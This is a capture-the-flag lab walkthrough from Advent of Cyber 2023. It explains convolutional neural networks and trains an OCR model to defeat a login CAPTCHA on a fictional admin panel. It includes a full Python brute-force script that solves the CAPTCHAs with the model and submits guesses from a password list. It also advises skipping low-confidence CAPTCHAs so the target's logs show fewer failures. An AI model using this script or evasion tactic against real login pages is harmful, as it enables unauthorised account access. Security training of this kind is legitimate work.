McGreedy has locked McSkidy out of his Elf(TM) HQ admin panel by changing the password! To make it harder for McSkidy to perform a hack-back, McGreedy has altered the admin panel login so that it uses a CAPTCHA to prevent automated attacks. A CAPTCHA is a small test, like providing the numbers in an image, that needs to be performed to ensure that you are a human. This means McSkidy can’t perform a brute force attack. Or does it?

After the great success of using machine learning to detect defective toys and phishing emails, McSkidy is looking to you to help him build a custom brute force script that will make use of ML to solve the CAPTCHA and continue with the brute force attack. There is, however, a bit of irony in having a machine solve a challenge specifically designed to tell humans apart from computers.

Learning Objectives

- Complex neural network structures
- How does a convolutional neural networks function?
- Using neural networks for optical character recognition
- Integrating neural networks into red team tooling

Introduction

In today’s task, we’ll get our first look at how red teams can use ML to help them attack systems. But before we can start attacking the admin portal, we’ll need to expand on some of the ML concepts taught in the previous tasks. Let’s dive in!

Convolutional Neural Networks

In the previous tasks, we talked about neural network structures. However, most of these structures were fairly basic in nature. Today, we will cover an interesting structure called a convolutional neural network (CNN).

CNNs are incredible ML structures that have the ability to extract features that can be used to train a neural network. In the previous task, we used the garbage-in, garbage-out principle to explain the importance of our inputs having good features. This ensures that the output from the neural network is accurate. But what if we could actually have the neural network select the important features itself? This is where CNN comes into play!

In essence, CNNs are normal neural networks that simply have the feature-extraction process as part of the network itself. This time, we’re not just using maths but combining it with linear algebra. Again, we won’t dive too deep into the maths here to keep things simple.

We can divide our CNN into three main components:

- Feature extraction
- Fully connected layers
- Classification

We’ve actually already covered the last two components in the previous tasks as a simple neural network structure, so our main focus for today will be on the feature-extraction component.

Feature Extraction

CNNs are often used to classify images. While we can use them with almost any data type, images are the simplest for explaining how a CNN works. This is the CAPTCHA that we are trying to crack:

![40531](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/68555400-45a2-4f92-b6b6-b264ec4c6cd2)

Since we’ll be using a CNN to crack CAPTCHAs, let’s use a single letter in the CAPTCHA as our image:

![4](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/191f39c0-b978-439d-868c-30d565aec3e8)

Image Representation

The first question to answer is how does the CNN actually perceive this image? The simplest way for a computer to perceive an image is as a 2D array of pixels. A pixel is the smallest area that can be measured in an image. Together, these pixels are what create the image. A pixel’s value describes the colour that you are seeing. There are two popular formats for pixel values:

RGB: The pixel is represented by three numbers from 0 to 255. These three numbers describe the intensity of the red, blue, and green colours of the pixel.

Greyscale: The pixel is represented by a single number from 0 to 255. 0 means the pixel is fully black, and 255 means the pixel is fully white. Any value in between is a shade of grey.

To represent the image as a 2D array, we start at the top left and capture the value of each pixel, working our way to the right in rows before moving down. Let’s take a look at what this would look like for our CAPTCHA:

![4444](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/851c3c05-e9d2-41db-8d0e-7fd4ada3398a)

Now that we have our representation of the image, let’s take a look at what the CNN will do with the image.

Convolution

There are two steps in the CNN feature extraction process that are performed as many times as needed. The first step is convolution. The maths is about to get slightly hectic here, so take a deep breath and let’s dive in!

During the convolution step of the CNN’s feature extraction, we want to reduce the size of the input. Images often have several thousand pixels, and while we can train a neural network to consider all of these pixels, it will be incredibly slow without really adding any additional accuracy. 

Therefore, we perform convolution to “summarise” the image. To do this, we move a kernel matrix across the entire image, calculating the summary. The kernel matrix is a smaller 2D array that tells us where in the image we are currently creating our summary. This kernel slides across the height and width of the image to create a summary image. Take a look at the animation below:

![a7](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/d52c8f3c-607b-4a1e-8eac-1424602f39f3)

As you can see from the animation, we start at the top-left of our image looking at a smaller 3*3 section. We then calculate the summary by multiplying each pixel with the value in the kernel. These kernel values can be set differently for different feature extractions, and we’re not limited to a single run. The values of these kernels are usually randomised at the start and then updated as the network is busy training. We say that each kernel run will create a summary slice. As you can see from the animation, by sliding this kernel across the entire image, we can create a smaller, summarised slice of our image. There are a couple of reasons why we want to do this:

As mentioned before, we can create a neural network that takes each pixel as input, but this would be an incredibly large network without improved accuracy. The summary created by the convolution process still allows us to capture the image’s important details without needing all the pixels. If our CNN’s accuracy decreases, then we can simply make the kernel smaller to capture more details during the input phase. The term used for this process is sparse interaction, as the final neural network won’t directly interact with each pixel. If you would like to learn more, you can read here.

If we calculate a feature in one location in our image, then that feature should be just as useful as a feature calculated in another location of the image. Making use of the same kernel to determine the summary slice means this condition is met. If we update the weights in one of our kernels, it will alter the summary for all pixels. This results in something called the property of equivariance to translation. Simply put, if we change the input in a specific way, the output will also get changed in that same way. If you would like to learn more, you can read here.

We perform this summary creation with several kernels to create several slices that are then sent to the next step of our CNN feature-extraction process.

Pooling

The second step performed in the CNN feature extraction process is pooling. Similar to convolution, the pooling step aims to further summarise the data using a statistical method. Let’s take another look at our single slice and how a max pooling will provide a summary of the maximum values:

![c0](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/399372de-b072-4c10-a893-050798448493)

As you can see, again, for each kernel, we create a summary based on the statistical method. For max pooling, this is finding the maximum value in the pixels. We could also use a different statistical method, such as average pooling. This calculates the average value of the pixels.

And that is basically it! That’s how the CNN determines its own features. Depending on the network structure, this process of convolution and pooling can be repeated multiple times. In the end, we’re left with the pooled values of each of our slices. These values now become the inputs for our neural network!

Fully Connected Layers

Now that we have our features, the next stage is really very similar to the basic neural network structure that we used back in the introduction to machine learning task. We’ll create a simple neural network that takes inputs (the summary slices from our last pooling layer), run them from the hidden layers, and then finally provide an output. This is called the fully connected layers portion of the CNN, as this is the part of the neural network where each node is re-connected to all the other nodes in the next layer.

Classification

Lastly, we need to talk about the classification portion of the CNN. This is the output layer from the fully connected layers portion. In the previous tasks, our neural networks only had one output to determine whether or not a toy was defective or whether or not an email was a phishing email. However, to crack CAPTCHAs, a simple binary output won’t do, as we need the network to tell us what the character (and, later, the sequence of characters) is. Therefore, we’ll need an output node for each potential character. Our CAPTCHA example only contains numbers, not letters. So, we need an output node for 0 to 9, totalling 10 output nodes.

Having multiple output nodes creates a new interesting feature for our neural network. Instead of simply getting one answer now, all 26 outputs will have a decimal value between 0 and 1. We’ll then summarise this by taking the highest value as the answer from the network. However, nothing is stopping us from reviewing the top 5 answers, for instance. This can help us identify areas where our neural network might be having issues.

For example, there could be a little confusion between the characters of M and N as they look fairly similar. Reviewing the output from the top 5 nodes will show us that this might be a problem. While we may not be able to solve this confusion directly, we could actually use this to our advantage and increase our brute force accuracy. We can do this by simply discarding the CAPTCHA if it has an M or N and requesting another to avoid the problem entirely!

Training our CNN

Now that we’ve covered the basics, let’s take a look at what will be required to train and use our own CNN to crack the CAPTCHAs. Please note that the following steps have already been performed for you. The next steps will be to perform in the Hosting the Model section. However, understanding how training works is an important aspect so please follow along and attempt the commands given.

We will be making use of the Attention OCR for our CNN model. This CNN structure has a lot more going on, such as LSTMs and sliding windows, but we won’t dive deeper into these steps in this instance. The only thing to note is that we have a sliding window, which allows us to read one character at a time instead of having to solve the entire CAPTCHA in one go.

We’ll be making use of the same steps followed to create CAPTCHA22, which is a Python Pip package that can be used to host a CAPTCHA-cracking server. If you’re interested in understanding how this works, you can have a read here. While you can try to run all this software yourself, most of the ML component runs on a very specific version of TensorFlow. Therefore, making use of the VM attached to the task is recommended.

In order to crack CAPTCHAs, we will have to go through the following steps:

Gather CAPTCHAs so we can create labelled data

Label the CAPTCHAs to use in a supervised learning model

Train our CAPTCHA-cracking CNN

Verify and test our CAPTCHA-cracking CNN

Export and host the trained model so we can feed it CAPTCHAs to solve

Create and execute a brute force script that will receive the CAPTCHA, pass it on to be solved, and then run the brute force attack

Steps 1–4 are quite taxing, so they have already been completed for you. We’ll do a quick recap of what these steps involve before moving on to hosting the model and cracking some CAPTCHAs!

To do this, you have to start the Docker container. In a terminal window, execute the following command:

```docker run -d -v /tmp/data:/tempdir/ aocr/full```

This will start a Docker container that has TensorFlow and AOCR already installed for you. You will need to connect to this container for the next few steps. First, you’ll need to find the container’s ID using the following command:

```docker ps```

Take note of your container’s ID and run the following command:

```docker exec -it CONTAINER_ID /bin/bash```

This will connect you to the container. You can now navigate to the following directory for the next few steps:

```cd /ocr/```

Gathering Training Data

In order to train our CAPTCHA-cracking CNN, we first have to create a dataset that can be used for training. Let’s take a look at the authentication portal for HQ admin. Open http://hqadmin.thm:8000 in a browser window in the VM and you’ll see the following authentication page:

![sign](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/73a3c947-3913-41a7-b04c-ae9c66ef146a)

As we can see, the authentication portal embeds a CAPTCHA image. We can get the raw image using a simple cURL command from a normal terminal window:

```curl http://hqadmin.thm:8000/```

In the output, you’ll see the base64 encoded version of the CAPTCHA image. We can write a script that will download this image and then prompt us to provide the answer for the CAPTCHA to store in a training dataset. This has already been done for you. You can view the stored data using the following command in the Docker container:

```ls -alh raw_data/dataset/```

Creating the Training Dataset

Next, we need to create the training dataset in a format that AOCR can use. This requires us to create a simple text file that lists the path for each CAPTCHA and the correct answer. A script was used to create this text file and can be found under the labelling directory. You can use the following command to view the text file that was created:

```cat labels/training.txt```

Once we have our text file, it has to be converted into a TensorFlow record that can be used for training. This has already been done for you, but you can use the following command to create the dataset:

```aocr dataset ./labels/training.txt ./training.tfrecords```

As mentioned before, this has already been done for you and is stored in the labels directory. We have created two datasets: one for training and one for testing. As mentioned in the introduction to machine learning task (Day 14), we need fresh data that our CNN has never seen before to test and verify that the model has been trained accurately – not overtrained. Just as in the previous task, we’ll only use the training dataset to train the model and then the testing dataset to test its accuracy.

Training and Testing the CNN

Finally, we can start training our model. This has already been done for you, but with all the preparation completed, you would be able to use this command to start the training:

```cd labels && aocr train training.tfrecords```

Training will now begin! Once the training has completed a couple of steps, stop it by pressing Ctrl+C. Let’s take a look at one of the output lines from running the training:

```2023-10-24 05:31:38,766 root INFO Step 1: 10.058s, loss: 0.002588, perplexity: 1.002592```.

In each of these steps, the CNN is trained on all of our inputs. Similar to what was discussed in the introduction to machine learning task, each image is given as an input to the CNN, which will then make a prediction on the numbers that are present in the CAPTCHA. We then provide feedback to the CNN on how accurate its predictions are. This process is performed for each image in our training dataset to complete one step of the training. The output from aocr shows us how long it took to perform this round of training and provides feedback on the loss and perplexity values:

Loss: Loss is the CNN’s prediction error. The closer the value is to 0, the smaller our prediction error. If you were to start training from scratch, the loss value would be incredibly high for the first couple of rounds until the network is trained. Any loss value below 0.005 would show that the network has either completed its learning process or has overtrained on the dataset.

Perplexity: Perplexity refers to how uncertain the CNN is in its prediction. The closer the value is to 1, the more certain the CNN is that its prediction is correct. Consider how “perplexed” the CNN would be seeing the image for the first time; seeing something new would be perplexing! But as the network becomes more familiar with the images, it’s almost as if you can’t show it anything new. Any value below 1.005 would be considered a trained (or overtrained) CNN.

As the CNN has already been trained for you, you can now test the CNN by running:

```aocr test testing.tfrecords```

Testing will now begin! Once a couple of testing steps are complete, you can stop it once again using Ctrl+C. Let’s take a look at two of the lines:

```
2023-10-24 06:02:14,623 root  INFO     Step 19 (0.079s). Accuracy: 100.00%, loss: 0.000448, perplexity: 1.00045, probability: 99.73% 100% (37469)
2023-10-24 06:02:14,690 root  INFO     Step 20 (0.066s). Accuracy: 99.00%, loss: 0.673766, perplexity: 1.96161, probability: 97.93%  80% (78642 vs 78542)
```

As you can see from the testing time, running a single image sample through the CNN is significantly faster than training it on the entire dataset. This is one of the true advantages of neural networks. Once training has been completed, the network is usually quick to provide a prediction. As we can see from the predictions provided at the end of the lines, one of the CAPTCHA predictions was completely correct, whereas another was a prediction error, mistaking a 5 for a 6.

If you compare the loss and perplexity values of the two samples, you will see that the CNN is uncertain about its answer. We can actually use this to our advantage when performing live predictions. We can create a discrepancy between CAPTCHA prediction accuracy and CAPTCHA submission accuracy simply by not submitting the CAPTCHAs that we are too uncertain about. Instead, we can request a new CAPTCHA. This enables us to change the OpSec of our attack, as the logs won’t show a significant amount of entries for incorrect CAPTCHA submissions.

We could even take this a step further and save the CAPTCHA images that were incorrect on submission. We can then label these manually and retrain our CNN to further improve its accuracy. This way, we can create a super CAPTCHA-cracking engine! You can read more about this process here.

Hosting Our CNN Model

Now that we’ve trained our CNN, we’ll need to host the CNN model to send it CAPTCHAs through our brute forcing script. For this, we will use TensorFlow Serving.

Once a CNN has been trained, we can export the weights of the different nodes. This allows us to recreate the trained network at any time. An export of the trained CNN has already been created for you under the /ocr/model/ directory. We’ll now export that model from the Docker container using the following command:

cd /ocr/ && cp -r model /tempdir/

Once that’s complete, you can exit the Docker container terminal (use the exit command) and kill it using the following command (you can reuse docker ps to get the container ID):

docker kill CONTAINER_ID

TensorFlow Serving will run in a Docker container. This container will then expose an API that we can use to interface with the hosted model to send it a CAPTCHA for prediction. You can start the Serving container using the following command:

```docker run -t --rm -p 8501:8501 -v /tmp/data/model/exported-model:/models/ -e MODEL_NAME=ocr tensorflow/serving```

This will start a new hosting of the OCR model that was exported from the AOCR training Docker container. We can connect to the model through the API hosted on http://localhost:8501/v1/models/ocr/

Now we’re finally ready to help McSkidy regain access to the HQ admin portal!

Brute Forcing the Admin Panel

We are now ready for our brute force attack. You’ve been provided with the custom script that we will use. You can find the custom script and password list on the desktop in the bruteforcer folder. Let’s take a look at the script:

```
#Import libraries
import requests
import base64
import json
from bs4 import BeautifulSoup

username = "admin"
passwords = []

#URLs for our requests
website_url = "http://hqadmin.thm:8000"
model_url = "http://localhost:8501/v1/models/ocr:predict"

#Load in the passwords for brute forcing
with open("passwords.txt", "r") as wordlist:
    lines = wordlist.readlines()
    for line in lines:
        passwords.append(line.replace("\n",""))


access_granted = False
count = 0

#Run the brute force attack until we are out of passwords or have gained access
while(access_granted == False and count < len(passwords)):
    #This will run a brute force for each password
    password = passwords[count]

    #First, we connect to the webapp so we can get the CAPTCHA. We will use a session so cookies are taken care of for us
    sess = requests.session()
    r = sess.get(website_url)
    
    #Use soup to parse the HTML and extract the CAPTCHA image
    soup = BeautifulSoup(r.content, 'html.parser')
    img = soup.find("img")    
    encoded_image = img['src'].split(" ")[1]
    
    #Build the JSON request to send to the CAPTCHA predictor
    model_data = {
        'signature_name' : 'serving_default',
        'inputs' : {'input' : {'b64' : encoded_image} }
        }
        
    #Send the CAPTCHA prediction request and load the response
    r = requests.post(model_url, json=model_data)
    prediction = r.json()
    probability = prediction["outputs"]["probability"]
    answer = prediction["outputs"]["output"]

    #We can increase our guessing accuracy by only submitting the answer if we are more than 90% sure
    if (probability < 0.90):
        #If lower than 90%, no submission of CAPTCHA
        print ("[-] Prediction probability too low, not submitting CAPTCHA")
        continue

    #Otherwise, we are good to go with our brute forcer
    #Build the POST data for our brute force attempt
    website_data = {
            'username' : username,
            'password' : password,
            'captcha' : answer,
            'submit' : "Submit+Query"
            }

    #Submit our brute force attack
    r = sess.post(website_url, data=website_data)

    #Read the response and interpret the results of the brute force attempt
    response = r.text

    #If the response tells us that we submitted the wrong CAPTCHA, we have to try again with this password
    if ("Incorrect CAPTCHA value supplied" in response):
        print ("[-] Incorrect CAPTCHA value was supplied. We will resubmit this password")
        continue
    #If the response tells us that we submitted the wrong password, we can try with the next password
    elif ("Incorrect Username or Password" in response):
        print ("[-] Invalid credential pair -- Username: " + username + " Password: " + password)
        count += 1
    #Otherwise, we have found the correct password!
    else:
        print ("[+] Access Granted!! -- Username: " + username + " Password: " + password)
        access_granted = True
```

Let’s dive into what this script is doing:

First, we load the libraries that will be used. We’ll mainly make use of Python’s request library to make the web requests on our behalf.

Next, we load our password list, which will be used for the brute force attacks.

In a loop, we will perform our brute force attack, which consists of the following steps:

Make a request to the HQ admin portal to get the cookie values and CAPTCHA image.

Submit the CAPTCHA image to our hosted CNN model.

Determine if the prediction accuracy of the CNN model was high enough to submit the CAPTCHA attempt.

Submit a brute force request to the HQ admin portal with the username, password, and CAPTCHA attempt.

Read the response from the HQ admin portal to determine what to do next.

Let’s run our brute force attack using the following command in a terminal window:

cd ~/Desktop/bruteforcer && python3 bruteforce.py

Let it run for a minute or two, and you will regain access to the HQ admin portal!

Conclusion

In this task, we have shown how ML can be used for red teaming purposes. We have also demonstrated how we can create custom scripts to perform tasks such as brute forcing the authentication of a web application. All we need is a spark of creativity! While we could have taken a pre-trained model such as Tesseract-OCR, it wouldn’t have been nearly as accurate as one trained specifically for the task at hand. This is true for most ML applications. While generic models will work to some degree, it’s often better to train a new model for the specific task we’re tackling.

Now that you’ve had a taste of what is possible, the sky’s the limit!

**Q/A**

![answers](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/b4cd13e5-c8f3-4fba-8600-978e6dfc70af)
